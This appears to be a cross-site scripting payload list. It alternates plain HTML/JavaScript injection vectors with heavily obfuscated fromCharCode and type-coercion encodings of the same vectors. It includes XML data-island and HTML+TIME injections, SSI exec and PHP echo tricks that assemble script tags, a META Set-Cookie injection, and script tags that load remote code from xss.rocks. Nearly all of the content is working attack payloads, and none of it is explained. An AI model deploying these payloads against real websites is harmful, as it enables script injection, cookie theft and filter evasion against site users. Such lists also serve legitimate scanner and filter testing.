[]["constructor"]["constructor"]("return String.fromCharCode(60)")()+[]["constructor"]["constructor"]("return String.fromCharCode(120)")()+[]["constructor"]["constructor"]("return String.fromCharCode(109)")()+(false+"")[2]+(false+[0]+"")[7]+([false]+"")[10]+([][""]+"")[4]+[]["constructor"]["constructor"]("return String.fromCharCode(61)")()+[]["constructor"]["constructor"]("return String.fromCharCode(34)")()+[]["constructor"]["constructor"]("return String.fromCharCode(120)")()+(false+"")[3]+(false+"")[3]+[]["constructor"]["constructor"]("return String.fromCharCode(34)")()+[]["constructor"]["constructor"]("return String.fromCharCode(62)")()+[]["constructor"]["constructor"]("return String.fromCharCode(60)")()+([false]+"")[10]+[]["constructor"]["constructor"]("return String.fromCharCode(62)")()+[]["constructor"]["constructor"]("return String.fromCharCode(60)")()+([][""]+"")[2]+[]["constructor"]["constructor"]("return String.fromCharCode(62)")()+[]["constructor"]["constructor"]("return String.fromCharCode(60)")()+([false]+"")[10]+[]["constructor"]["constructor"]("return String.fromCharCode(109)")()+(false+[0]+"")[2]+(false+[0]+"")[7]+(false+"")[3]+(true+"")[1]+([false]+"")[3]+[]["constructor"]["constructor"]("return String.fromCharCode(61)")()+[]["constructor"]["constructor"]("return String.fromCharCode(34)")()+([][""]+"")[3]+(false+"")[1]+[]["constructor"]["constructor"]("return String.fromCharCode(118)")()+(false+"")[1]+(false+"")[3]+[]["constructor"]["constructor"]("return String.fromCharCode(60)")()+[]["constructor"]["constructor"]("return String.fromCharCode(33)")()+[]["constructor"]["constructor"]("return String.fromCharCode(45)")()+[]["constructor"]["constructor"]("return String.fromCharCode(45)")()+(false+[0]+"")[7]+[]["constructor"]["constructor"]("return String.fromCharCode(45)")()+[]["constructor"]["constructor"]("return String.fromCharCode(45)")()+[]["constructor"]["constructor"]("return String.fromCharCode(62)")()+([false]+"")[3]+(true+"")[1]+([false]+"")[10]+[]["constructor"]["constructor"]("return String.fromCharCode(112)")()+(true+"")[0]+[]["constructor"]["constructor"]("return String.fromCharCode(58)")()+[]["constructor"]["constructor"]("return String.fromCharCode(112)")()+(true+"")[1]+[]["constructor"]["constructor"]("return String.fromCharCode(111)")()+[]["constructor"]["constructor"]("return String.fromCharCode(109)")()+[]["constructor"]["constructor"]("return String.fromCharCode(112)")()+(true+"")[0]+([false]+"")[11]+(+!+[]+[])[0]+(+!+[]+!+[]+!+[]+!+[]+[])[0]+(+!+[]+!+[]+!+[]+!+[]+[])[0]+([false]+"")[12]+[]["constructor"]["constructor"]("return String.fromCharCode(34)")()+[]["constructor"]["constructor"]("return String.fromCharCode(62)")()+[]["constructor"]["constructor"]("return String.fromCharCode(60)")()+[]["constructor"]["constructor"]("return String.fromCharCode(47)")()+([][""]+"")[2]+[]["constructor"]["constructor"]("return String.fromCharCode(62)")()+[]["constructor"]["constructor"]("return String.fromCharCode(60)")()+[]["constructor"]["constructor"]("return String.fromCharCode(47)")()+([false]+"")[10]+[]["constructor"]["constructor"]("return String.fromCharCode(62)")()+[]["constructor"]["constructor"]("return String.fromCharCode(60)")()+[]["constructor"]["constructor"]("return String.fromCharCode(47)")()+[]["constructor"]["constructor"]("return String.fromCharCode(120)")()+[]["constructor"]["constructor"]("return String.fromCharCode(109)")()+(false+"")[2]+[]["constructor"]["constructor"]("return String.fromCharCode(62)")()
<SPAN DATASRC="#xss" DATAFLD="B" DATAFORMATAS="HTML"></SPAN>
[]["constructor"]["constructor"]("return String.fromCharCode(60)")()+(false+"")[3]+[]["constructor"]["constructor"]("return String.fromCharCode(112)")()+(false+"")[1]+(undefined+"")[1]+(false+[0]+"")[7]+([][""]+"")[4]+(false+"")[1]+(true+"")[0]+(false+"")[1]+(false+"")[3]+(true+"")[1]+([false]+"")[3]+[]["constructor"]["constructor"]("return String.fromCharCode(61)")()+[]["constructor"]["constructor"]("return String.fromCharCode(34)")()+[]["constructor"]["constructor"]("return String.fromCharCode(35)")()+[]["constructor"]["constructor"]("return String.fromCharCode(120)")()+(false+"")[3]+(false+"")[3]+[]["constructor"]["constructor"]("return String.fromCharCode(34)")()+(false+[0]+"")[7]+([][""]+"")[4]+(false+"")[1]+(true+"")[0]+(false+"")[1]+(false+"")[0]+(false+"")[2]+([][""]+"")[4]+[]["constructor"]["constructor"]("return String.fromCharCode(61)")()+[]["constructor"]["constructor"]("return String.fromCharCode(34)")()+([][""]+"")[2]+[]["constructor"]["constructor"]("return String.fromCharCode(34)")()+(false+[0]+"")[7]+([][""]+"")[4]+(false+"")[1]+(true+"")[0]+(false+"")[1]+(false+"")[0]+[]["constructor"]["constructor"]("return String.fromCharCode(111)")()+(true+"")[1]+[]["constructor"]["constructor"]("return String.fromCharCode(109)")()+(false+"")[1]+(true+"")[0]+(false+"")[1]+(false+"")[3]+[]["constructor"]["constructor"]("return String.fromCharCode(61)")()+[]["constructor"]["constructor"]("return String.fromCharCode(34)")()+(+(101))["to"+String["name"]]()[1]+(true+"")[0]+[]["constructor"]["constructor"]("return String.fromCharCode(109)")()+(false+"")[2]+[]["constructor"]["constructor"]("return String.fromCharCode(34)")()+[]["constructor"]["constructor"]("return String.fromCharCode(62)")()+[]["constructor"]["constructor"]("return String.fromCharCode(60)")()+[]["constructor"]["constructor"]("return String.fromCharCode(47)")()+(false+"")[3]+[]["constructor"]["constructor"]("return String.fromCharCode(112)")()+(false+"")[1]+(undefined+"")[1]+[]["constructor"]["constructor"]("return String.fromCharCode(62)")()
<XML SRC="xsstest.xml" ID=I></XML>
[]["constructor"]["constructor"]("return String.fromCharCode(60)")()+[]["constructor"]["constructor"]("return String.fromCharCode(120)")()+[]["constructor"]["constructor"]("return String.fromCharCode(109)")()+(false+"")[2]+(false+[0]+"")[7]+(false+"")[3]+(true+"")[1]+([false]+"")[3]+[]["constructor"]["constructor"]("return String.fromCharCode(61)")()+[]["constructor"]["constructor"]("return String.fromCharCode(34)")()+[]["constructor"]["constructor"]("return String.fromCharCode(120)")()+(false+"")[3]+(false+"")[3]+(true+"")[0]+(true+"")[3]+(false+"")[3]+(true+"")[0]+[]["constructor"]["constructor"]("return String.fromCharCode(46)")()+[]["constructor"]["constructor"]("return String.fromCharCode(120)")()+[]["constructor"]["constructor"]("return String.fromCharCode(109)")()+(false+"")[2]+[]["constructor"]["constructor"]("return String.fromCharCode(34)")()+(false+[0]+"")[7]+([false]+"")[10]+([][""]+"")[4]+[]["constructor"]["constructor"]("return String.fromCharCode(61)")()+([false]+"")[10]+[]["constructor"]["constructor"]("return String.fromCharCode(62)")()+[]["constructor"]["constructor"]("return String.fromCharCode(60)")()+[]["constructor"]["constructor"]("return String.fromCharCode(47)")()+[]["constructor"]["constructor"]("return String.fromCharCode(120)")()+[]["constructor"]["constructor"]("return String.fromCharCode(109)")()+(false+"")[2]+[]["constructor"]["constructor"]("return String.fromCharCode(62)")()
<SPAN DATASRC=#I DATAFLD=C DATAFORMATAS=HTML></SPAN>
[]["constructor"]["constructor"]("return String.fromCharCode(60)")()+(false+"")[3]+[]["constructor"]["constructor"]("return String.fromCharCode(112)")()+(false+"")[1]+(undefined+"")[1]+(false+[0]+"")[7]+([][""]+"")[4]+(false+"")[1]+(true+"")[0]+(false+"")[1]+(false+"")[3]+(true+"")[1]+([false]+"")[3]+[]["constructor"]["constructor"]("return String.fromCharCode(61)")()+[]["constructor"]["constructor"]("return String.fromCharCode(35)")()+([false]+"")[10]+(false+[0]+"")[7]+([][""]+"")[4]+(false+"")[1]+(true+"")[0]+(false+"")[1]+(false+"")[0]+(false+"")[2]+([][""]+"")[4]+[]["constructor"]["constructor"]("return String.fromCharCode(61)")()+([false]+"")[3]+(false+[0]+"")[7]+([][""]+"")[4]+(false+"")[1]+(true+"")[0]+(false+"")[1]+(false+"")[0]+[]["constructor"]["constructor"]("return String.fromCharCode(111)")()+(true+"")[1]+[]["constructor"]["constructor"]("return String.fromCharCode(109)")()+(false+"")[1]+(true+"")[0]+(false+"")[1]+(false+"")[3]+[]["constructor"]["constructor"]("return String.fromCharCode(61)")()+(+(101))["to"+String["name"]]()[1]+(true+"")[0]+[]["constructor"]["constructor"]("return String.fromCharCode(109)")()+(false+"")[2]+[]["constructor"]["constructor"]("return String.fromCharCode(62)")()+[]["constructor"]["constructor"]("return String.fromCharCode(60)")()+[]["constructor"]["constructor"]("return String.fromCharCode(47)")()+(false+"")[3]+[]["constructor"]["constructor"]("return String.fromCharCode(112)")()+(false+"")[1]+(undefined+"")[1]+[]["constructor"]["constructor"]("return String.fromCharCode(62)")()
<HTML><BODY> <?xml:namespace prefix="t" ns="urn:schemas-microsoft-com:time"> <?import namespace="t" implementation="#default#time2"> <t:set attributeName="innerHTML" to="XSS-151<SCRIPT DEFER>prompt(151)</SCRIPT>"> </BODY></HTML>
[]["constructor"]["constructor"]("return String.fromCharCode(60)")()+(+(101))["to"+String["name"]]()[1]+(true+"")[0]+[]["constructor"]["constructor"]("return String.fromCharCode(109)")()+(false+"")[2]+[]["constructor"]["constructor"]("return String.fromCharCode(62)")()+[]["constructor"]["constructor"]("return String.fromCharCode(60)")()+([][""]+"")[2]+[]["constructor"]["constructor"]("return String.fromCharCode(111)")()+([][""]+"")[4]+[]["constructor"]["constructor"]("return String.fromCharCode(121)")()+[]["constructor"]["constructor"]("return String.fromCharCode(62)")()+(false+[0]+"")[7]+[]["constructor"]["constructor"]("return String.fromCharCode(60)")()+[]["constructor"]["constructor"]("return String.fromCharCode(63)")()+[]["constructor"]["constructor"]("return String.fromCharCode(120)")()+[]["constructor"]["constructor"]("return String.fromCharCode(109)")()+(false+"")[2]+[]["constructor"]["constructor"]("return String.fromCharCode(58)")()+(undefined+"")[1]+(false+"")[1]+[]["constructor"]["constructor"]("return String.fromCharCode(109)")()+(true+"")[3]+(false+"")[3]+[]["constructor"]["constructor"]("return String.fromCharCode(112)")()+(false+"")[1]+([false]+"")[3]+(true+"")[3]+(false+[0]+"")[7]+[]["constructor"]["constructor"]("return String.fromCharCode(112)")()+(true+"")[1]+(true+"")[3]+(false+"")[0]+([false]+"")[10]+[]["constructor"]["constructor"]("return String.fromCharCode(120)")()+[]["constructor"]["constructor"]("return String.fromCharCode(61)")()+[]["constructor"]["constructor"]("return String.fromCharCode(34)")()+(true+"")[0]+[]["constructor"]["constructor"]("return String.fromCharCode(34)")()+(false+[0]+"")[7]+(undefined+"")[1]+(false+"")[3]+[]["constructor"]["constructor"]("return String.fromCharCode(61)")()+[]["constructor"]["constructor"]("return String.fromCharCode(34)")()+(undefined+"")[0]+(true+"")[1]+(undefined+"")[1]+[]["constructor"]["constructor"]("return String.fromCharCode(58)")()+(false+"")[3]+([false]+"")[3]+(+(101))["to"+String["name"]]()[1]+(true+"")[3]+[]["constructor"]["constructor"]("return String.fromCharCode(109)")()+(false+"")[1]+(false+"")[3]+[]["constructor"]["constructor"]("return String.fromCharCode(45)")()+[]["constructor"]["constructor"]("return String.fromCharCode(109)")()+([false]+"")[10]+([false]+"")[3]+(true+"")[1]+[]["constructor"]["constructor"]("return String.fromCharCode(111)")()+(false+"")[3]+[]["constructor"]["constructor"]("return String.fromCharCode(111)")()+(false+"")[0]+(true+"")[0]+[]["constructor"]["constructor"]("return String.fromCharCode(45)")()+([false]+"")[3]+[]["constructor"]["constructor"]("return String.fromCharCode(111)")()+[]["constructor"]["constructor"]("return String.fromCharCode(109)")()+[]["constructor"]["constructor"]("return String.fromCharCode(58)")()+(true+"")[0]+([false]+"")[10]+[]["constructor"]["constructor"]("return String.fromCharCode(109)")()+(true+"")[3]+[]["constructor"]["constructor"]("return String.fromCharCode(34)")()+[]["constructor"]["constructor"]("return String.fromCharCode(62)")()+(false+[0]+"")[7]+[]["constructor"]["constructor"]("return String.fromCharCode(60)")()+[]["constructor"]["constructor"]("return String.fromCharCode(63)")()+([false]+"")[10]+[]["constructor"]["constructor"]("return String.fromCharCode(109)")()+[]["constructor"]["constructor"]("return String.fromCharCode(112)")()+[]["constructor"]["constructor"]("return String.fromCharCode(111)")()+(true+"")[1]+(true+"")[0]+(false+[0]+"")[7]+(undefined+"")[1]+(false+"")[1]+[]["constructor"]["constructor"]("return String.fromCharCode(109)")()+(true+"")[3]+(false+"")[3]+[]["constructor"]["constructor"]("return String.fromCharCode(112)")()+(false+"")[1]+([false]+"")[3]+(true+"")[3]+[]["constructor"]["constructor"]("return String.fromCharCode(61)")()+[]["constructor"]["constructor"]("return String.fromCharCode(34)")()+(true+"")[0]+[]["constructor"]["constructor"]("return String.fromCharCode(34)")()+(false+[0]+"")[7]+([false]+"")[10]+[]["constructor"]["constructor"]("return String.fromCharCode(109)")()+[]["constructor"]["constructor"]("return String.fromCharCode(112)")()+(false+"")[2]+(true+"")[3]+[]["constructor"]["constructor"]("return String.fromCharCode(109)")()+(true+"")[3]+(undefined+"")[1]+(true+"")[0]+(false+"")[1]+(true+"")[0]+([false]+"")[10]+[]["constructor"]["constructor"]("return String.fromCharCode(111)")()+(undefined+"")[1]+[]["constructor"]["constructor"]("return String.fromCharCode(61)")()+[]["constructor"]["constructor"]("return String.fromCharCode(34)")()+[]["constructor"]["constructor"]("return String.fromCharCode(35)")()+([][""]+"")[4]+(true+"")[3]+(false+"")[0]+(false+"")[1]+(undefined+"")[0]+(false+"")[2]+(true+"")[0]+[]["constructor"]["constructor"]("return String.fromCharCode(35)")()+(true+"")[0]+([false]+"")[10]+[]["constructor"]["constructor"]("return String.fromCharCode(109)")()+(true+"")[3]+(+!+[]+!+[]+[])[0]+[]["constructor"]["constructor"]("return String.fromCharCode(34)")()+[]["constructor"]["constructor"]("return String.fromCharCode(62)")()+(false+[0]+"")[7]+[]["constructor"]["constructor"]("return String.fromCharCode(60)")()+(true+"")[0]+[]["constructor"]["constructor"]("return String.fromCharCode(58)")()+(false+"")[3]+(true+"")[3]+(true+"")[0]+(false+[0]+"")[7]+(false+"")[1]+(true+"")[0]+(true+"")[0]+(true+"")[1]+([false]+"")[10]+([][""]+"")[2]+(undefined+"")[0]+(true+"")[0]+(true+"")[3]+(undefined+"")[1]+(false+"")[1]+[]["constructor"]["constructor"]("return String.fromCharCode(109)")()+(true+"")[3]+[]["constructor"]["constructor"]("return String.fromCharCode(61)")()+[]["constructor"]["constructor"]("return String.fromCharCode(34)")()+([false]+"")[10]+(undefined+"")[1]+(undefined+"")[1]+(true+"")[3]+(true+"")[1]+(+(101))["to"+String["name"]]()[1]+(true+"")[0]+[]["constructor"]["constructor"]("return String.fromCharCode(109)")()+(false+"")[2]+[]["constructor"]["constructor"]("return String.fromCharCode(34)")()+(false+[0]+"")[7]+(true+"")[0]+[]["constructor"]["constructor"]("return String.fromCharCode(111)")()+[]["constructor"]["constructor"]("return String.fromCharCode(61)")()+[]["constructor"]["constructor"]("return String.fromCharCode(34)")()+[]["constructor"]["constructor"]("return String.fromCharCode(120)")()+(false+"")[3]+(false+"")[3]+[]["constructor"]["constructor"]("return String.fromCharCode(45)")()+(+!+[]+[])[0]+(+!+[]+!+[]+!+[]+!+[]+!+[]+[])[0]+(+!+[]+!+[]+[])[0]+[]["constructor"]["constructor"]("return String.fromCharCode(60)")()+(false+"")[3]+([false]+"")[3]+(true+"")[1]+([false]+"")[10]+[]["constructor"]["constructor"]("return String.fromCharCode(112)")()+(true+"")[0]+(false+[0]+"")[7]+([][""]+"")[4]+(true+"")[3]+(false+"")[0]+(true+"")[3]+(true+"")[1]+[]["constructor"]["constructor"]("return String.fromCharCode(62)")()+[]["constructor"]["constructor"]("return String.fromCharCode(112)")()+(true+"")[1]+[]["constructor"]["constructor"]("return String.fromCharCode(111)")()+[]["constructor"]["constructor"]("return String.fromCharCode(109)")()+[]["constructor"]["constructor"]("return String.fromCharCode(112)")()+(true+"")[0]+([false]+"")[11]+(+!+[]+[])[0]+(+!+[]+!+[]+!+[]+!+[]+!+[]+[])[0]+(+!+[]+!+[]+[])[0]+([false]+"")[12]+[]["constructor"]["constructor"]("return String.fromCharCode(60)")()+[]["constructor"]["constructor"]("return String.fromCharCode(47)")()+(false+"")[3]+([false]+"")[3]+(true+"")[1]+([false]+"")[10]+[]["constructor"]["constructor"]("return String.fromCharCode(112)")()+(true+"")[0]+[]["constructor"]["constructor"]("return String.fromCharCode(62)")()+[]["constructor"]["constructor"]("return String.fromCharCode(34)")()+[]["constructor"]["constructor"]("return String.fromCharCode(62)")()+(false+[0]+"")[7]+[]["constructor"]["constructor"]("return String.fromCharCode(60)")()+[]["constructor"]["constructor"]("return String.fromCharCode(47)")()+([][""]+"")[2]+[]["constructor"]["constructor"]("return String.fromCharCode(111)")()+([][""]+"")[4]+[]["constructor"]["constructor"]("return String.fromCharCode(121)")()+[]["constructor"]["constructor"]("return String.fromCharCode(62)")()+[]["constructor"]["constructor"]("return String.fromCharCode(60)")()+[]["constructor"]["constructor"]("return String.fromCharCode(47)")()+(+(101))["to"+String["name"]]()[1]+(true+"")[0]+[]["constructor"]["constructor"]("return String.fromCharCode(109)")()+(false+"")[2]+[]["constructor"]["constructor"]("return String.fromCharCode(62)")()
<SCRIPT SRC="http://xss.rocks/xss.jpg"></SCRIPT>
[]["constructor"]["constructor"]("return String.fromCharCode(60)")()+(false+"")[3]+([false]+"")[3]+(true+"")[1]+([false]+"")[10]+[]["constructor"]["constructor"]("return String.fromCharCode(112)")()+(true+"")[0]+(false+[0]+"")[7]+(false+"")[3]+(true+"")[1]+([false]+"")[3]+[]["constructor"]["constructor"]("return String.fromCharCode(61)")()+[]["constructor"]["constructor"]("return String.fromCharCode(34)")()+(+(101))["to"+String["name"]]()[1]+(true+"")[0]+(true+"")[0]+[]["constructor"]["constructor"]("return String.fromCharCode(112)")()+[]["constructor"]["constructor"]("return String.fromCharCode(58)")()+[]["constructor"]["constructor"]("return String.fromCharCode(47)")()+[]["constructor"]["constructor"]("return String.fromCharCode(47)")()+[]["constructor"]["constructor"]("return String.fromCharCode(120)")()+(false+"")[3]+(false+"")[3]+[]["constructor"]["constructor"]("return String.fromCharCode(46)")()+(true+"")[1]+[]["constructor"]["constructor"]("return String.fromCharCode(111)")()+([false]+"")[3]+[]["constructor"]["constructor"]("return String.fromCharCode(107)")()+(false+"")[3]+[]["constructor"]["constructor"]("return String.fromCharCode(47)")()+[]["constructor"]["constructor"]("return String.fromCharCode(120)")()+(false+"")[3]+(false+"")[3]+[]["constructor"]["constructor"]("return String.fromCharCode(46)")()+([][""]+"")[3]+[]["constructor"]["constructor"]("return String.fromCharCode(112)")()+(false+[0]+"")[2]+[]["constructor"]["constructor"]("return String.fromCharCode(34)")()+[]["constructor"]["constructor"]("return String.fromCharCode(62)")()+[]["constructor"]["constructor"]("return String.fromCharCode(60)")()+[]["constructor"]["constructor"]("return String.fromCharCode(47)")()+(false+"")[3]+([false]+"")[3]+(true+"")[1]+([false]+"")[10]+[]["constructor"]["constructor"]("return String.fromCharCode(112)")()+(true+"")[0]+[]["constructor"]["constructor"]("return String.fromCharCode(62)")()
<!--#exec cmd="/bin/echo '<SCR'"--><!--#exec cmd="/bin/echo 'IPT SRC=http://xss.rocks/xss.js></SCRIPT>'"-->
[]["constructor"]["constructor"]("return String.fromCharCode(60)")()+[]["constructor"]["constructor"]("return String.fromCharCode(33)")()+[]["constructor"]["constructor"]("return String.fromCharCode(45)")()+[]["constructor"]["constructor"]("return String.fromCharCode(45)")()+[]["constructor"]["constructor"]("return String.fromCharCode(35)")()+(true+"")[3]+[]["constructor"]["constructor"]("return String.fromCharCode(120)")()+(true+"")[3]+([false]+"")[3]+(false+[0]+"")[7]+([false]+"")[3]+[]["constructor"]["constructor"]("return String.fromCharCode(109)")()+([][""]+"")[4]+[]["constructor"]["constructor"]("return String.fromCharCode(61)")()+[]["constructor"]["constructor"]("return String.fromCharCode(34)")()+[]["constructor"]["constructor"]("return String.fromCharCode(47)")()+([][""]+"")[2]+([false]+"")[10]+(undefined+"")[1]+[]["constructor"]["constructor"]("return String.fromCharCode(47)")()+(true+"")[3]+([false]+"")[3]+(+(101))["to"+String["name"]]()[1]+[]["constructor"]["constructor"]("return String.fromCharCode(111)")()+(false+[0]+"")[7]+[]["constructor"]["constructor"]("return String.fromCharCode(39)")()+[]["constructor"]["constructor"]("return String.fromCharCode(60)")()+(false+"")[3]+([false]+"")[3]+(true+"")[1]+[]["constructor"]["constructor"]("return String.fromCharCode(39)")()+[]["constructor"]["constructor"]("return String.fromCharCode(34)")()+[]["constructor"]["constructor"]("return String.fromCharCode(45)")()+[]["constructor"]["constructor"]("return String.fromCharCode(45)")()+[]["constructor"]["constructor"]("return String.fromCharCode(62)")()+[]["constructor"]["constructor"]("return String.fromCharCode(60)")()+[]["constructor"]["constructor"]("return String.fromCharCode(33)")()+[]["constructor"]["constructor"]("return String.fromCharCode(45)")()+[]["constructor"]["constructor"]("return String.fromCharCode(45)")()+[]["constructor"]["constructor"]("return String.fromCharCode(35)")()+(true+"")[3]+[]["constructor"]["constructor"]("return String.fromCharCode(120)")()+(true+"")[3]+([false]+"")[3]+(false+[0]+"")[7]+([false]+"")[3]+[]["constructor"]["constructor"]("return String.fromCharCode(109)")()+([][""]+"")[4]+[]["constructor"]["constructor"]("return String.fromCharCode(61)")()+[]["constructor"]["constructor"]("return String.fromCharCode(34)")()+[]["constructor"]["constructor"]("return String.fromCharCode(47)")()+([][""]+"")[2]+([false]+"")[10]+(undefined+"")[1]+[]["constructor"]["constructor"]("return String.fromCharCode(47)")()+(true+"")[3]+([false]+"")[3]+(+(101))["to"+String["name"]]()[1]+[]["constructor"]["constructor"]("return String.fromCharCode(111)")()+(false+[0]+"")[7]+[]["constructor"]["constructor"]("return String.fromCharCode(39)")()+([false]+"")[10]+[]["constructor"]["constructor"]("return String.fromCharCode(112)")()+(true+"")[0]+(false+[0]+"")[7]+(false+"")[3]+(true+"")[1]+([false]+"")[3]+[]["constructor"]["constructor"]("return String.fromCharCode(61)")()+(+(101))["to"+String["name"]]()[1]+(true+"")[0]+(true+"")[0]+[]["constructor"]["constructor"]("return String.fromCharCode(112)")()+[]["constructor"]["constructor"]("return String.fromCharCode(58)")()+[]["constructor"]["constructor"]("return String.fromCharCode(47)")()+[]["constructor"]["constructor"]("return String.fromCharCode(47)")()+[]["constructor"]["constructor"]("return String.fromCharCode(120)")()+(false+"")[3]+(false+"")[3]+[]["constructor"]["constructor"]("return String.fromCharCode(46)")()+(true+"")[1]+[]["constructor"]["constructor"]("return String.fromCharCode(111)")()+([false]+"")[3]+[]["constructor"]["constructor"]("return String.fromCharCode(107)")()+(false+"")[3]+[]["constructor"]["constructor"]("return String.fromCharCode(47)")()+[]["constructor"]["constructor"]("return String.fromCharCode(120)")()+(false+"")[3]+(false+"")[3]+[]["constructor"]["constructor"]("return String.fromCharCode(46)")()+([][""]+"")[3]+(false+"")[3]+[]["constructor"]["constructor"]("return String.fromCharCode(62)")()+[]["constructor"]["constructor"]("return String.fromCharCode(60)")()+[]["constructor"]["constructor"]("return String.fromCharCode(47)")()+(false+"")[3]+([false]+"")[3]+(true+"")[1]+([false]+"")[10]+[]["constructor"]["constructor"]("return String.fromCharCode(112)")()+(true+"")[0]+[]["constructor"]["constructor"]("return String.fromCharCode(62)")()+[]["constructor"]["constructor"]("return String.fromCharCode(39)")()+[]["constructor"]["constructor"]("return String.fromCharCode(34)")()+[]["constructor"]["constructor"]("return String.fromCharCode(45)")()+[]["constructor"]["constructor"]("return String.fromCharCode(45)")()+[]["constructor"]["constructor"]("return String.fromCharCode(62)")()
<IMG SRC="http://www.thesiteyouareon.com/somecommand.php?somevariables=maliciouscode">
[]["constructor"]["constructor"]("return String.fromCharCode(60)")()+([false]+"")[10]+[]["constructor"]["constructor"]("return String.fromCharCode(109)")()+(false+[0]+"")[2]+(false+[0]+"")[7]+(false+"")[3]+(true+"")[1]+([false]+"")[3]+[]["constructor"]["constructor"]("return String.fromCharCode(61)")()+[]["constructor"]["constructor"]("return String.fromCharCode(34)")()+(+(101))["to"+String["name"]]()[1]+(true+"")[0]+(true+"")[0]+[]["constructor"]["constructor"]("return String.fromCharCode(112)")()+[]["constructor"]["constructor"]("return String.fromCharCode(58)")()+[]["constructor"]["constructor"]("return String.fromCharCode(47)")()+[]["constructor"]["constructor"]("return String.fromCharCode(47)")()+[]["constructor"]["constructor"]("return String.fromCharCode(119)")()+[]["constructor"]["constructor"]("return String.fromCharCode(119)")()+[]["constructor"]["constructor"]("return String.fromCharCode(119)")()+[]["constructor"]["constructor"]("return String.fromCharCode(46)")()+(true+"")[0]+(+(101))["to"+String["name"]]()[1]+(true+"")[3]+(false+"")[3]+([false]+"")[10]+(true+"")[0]+(true+"")[3]+[]["constructor"]["constructor"]("return String.fromCharCode(121)")()+[]["constructor"]["constructor"]("return String.fromCharCode(111)")()+(undefined+"")[0]+(false+"")[1]+(true+"")[1]+(true+"")[3]+[]["constructor"]["constructor"]("return String.fromCharCode(111)")()+(undefined+"")[1]+[]["constructor"]["constructor"]("return String.fromCharCode(46)")()+([false]+"")[3]+[]["constructor"]["constructor"]("return String.fromCharCode(111)")()+[]["constructor"]["constructor"]("return String.fromCharCode(109)")()+[]["constructor"]["constructor"]("return String.fromCharCode(47)")()+(false+"")[3]+[]["constructor"]["constructor"]("return String.fromCharCode(111)")()+[]["constructor"]["constructor"]("return String.fromCharCode(109)")()+(true+"")[3]+([false]+"")[3]+[]["constructor"]["constructor"]("return String.fromCharCode(111)")()+[]["constructor"]["constructor"]("return String.fromCharCode(109)")()+[]["constructor"]["constructor"]("return String.fromCharCode(109)")()+(false+"")[1]+(undefined+"")[1]+([][""]+"")[4]+[]["constructor"]["constructor"]("return String.fromCharCode(46)")()+[]["constructor"]["constructor"]("return String.fromCharCode(112)")()+(+(101))["to"+String["name"]]()[1]+[]["constructor"]["constructor"]("return String.fromCharCode(112)")()+[]["constructor"]["constructor"]("return String.fromCharCode(63)")()+(false+"")[3]+[]["constructor"]["constructor"]("return String.fromCharCode(111)")()+[]["constructor"]["constructor"]("return String.fromCharCode(109)")()+(true+"")[3]+[]["constructor"]["constructor"]("return String.fromCharCode(118)")()+(false+"")[1]+(true+"")[1]+([false]+"")[10]+(false+"")[1]+([][""]+"")[2]+(false+"")[2]+(true+"")[3]+(false+"")[3]+[]["constructor"]["constructor"]("return String.fromCharCode(61)")()+[]["constructor"]["constructor"]("return String.fromCharCode(109)")()+(false+"")[1]+(false+"")[2]+([false]+"")[10]+([false]+"")[3]+([false]+"")[10]+[]["constructor"]["constructor"]("return String.fromCharCode(111)")()+(undefined+"")[0]+(false+"")[3]+([false]+"")[3]+[]["constructor"]["constructor"]("return String.fromCharCode(111)")()+([][""]+"")[4]+(true+"")[3]+[]["constructor"]["constructor"]("return String.fromCharCode(34)")()+[]["constructor"]["constructor"]("return String.fromCharCode(62)")()
<? echo('<SCR)'; echo('IPT>prompt(159)</SCRIPT>'); ?>
[]["constructor"]["constructor"]("return String.fromCharCode(60)")()+[]["constructor"]["constructor"]("return String.fromCharCode(63)")()+(false+[0]+"")[7]+(true+"")[3]+([false]+"")[3]+(+(101))["to"+String["name"]]()[1]+[]["constructor"]["constructor"]("return String.fromCharCode(111)")()+([false]+"")[11]+[]["constructor"]["constructor"]("return String.fromCharCode(39)")()+[]["constructor"]["constructor"]("return String.fromCharCode(60)")()+(false+"")[3]+([false]+"")[3]+(true+"")[1]+([false]+"")[12]+[]["constructor"]["constructor"]("return String.fromCharCode(39)")()+[]["constructor"]["constructor"]("return String.fromCharCode(59)")()+(false+[0]+"")[7]+(true+"")[3]+([false]+"")[3]+(+(101))["to"+String["name"]]()[1]+[]["constructor"]["constructor"]("return String.fromCharCode(111)")()+([false]+"")[11]+[]["constructor"]["constructor"]("return String.fromCharCode(39)")()+([false]+"")[10]+[]["constructor"]["constructor"]("return String.fromCharCode(112)")()+(true+"")[0]+[]["constructor"]["constructor"]("return String.fromCharCode(62)")()+[]["constructor"]["constructor"]("return String.fromCharCode(112)")()+(true+"")[1]+[]["constructor"]["constructor"]("return String.fromCharCode(111)")()+[]["constructor"]["constructor"]("return String.fromCharCode(109)")()+[]["constructor"]["constructor"]("return String.fromCharCode(112)")()+(true+"")[0]+([false]+"")[11]+(+!+[]+[])[0]+(+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+[])[0]+(+[]+[])[0]+([false]+"")[12]+[]["constructor"]["constructor"]("return String.fromCharCode(60)")()+[]["constructor"]["constructor"]("return String.fromCharCode(47)")()+(false+"")[3]+([false]+"")[3]+(true+"")[1]+([false]+"")[10]+[]["constructor"]["constructor"]("return String.fromCharCode(112)")()+(true+"")[0]+[]["constructor"]["constructor"]("return String.fromCharCode(62)")()+[]["constructor"]["constructor"]("return String.fromCharCode(39)")()+([false]+"")[12]+[]["constructor"]["constructor"]("return String.fromCharCode(59)")()+(false+[0]+"")[7]+[]["constructor"]["constructor"]("return String.fromCharCode(63)")()+[]["constructor"]["constructor"]("return String.fromCharCode(62)")()
<META HTTP-EQUIV="Set-Cookie" Content="USERID=<SCRIPT>prompt(161)</SCRIPT>">
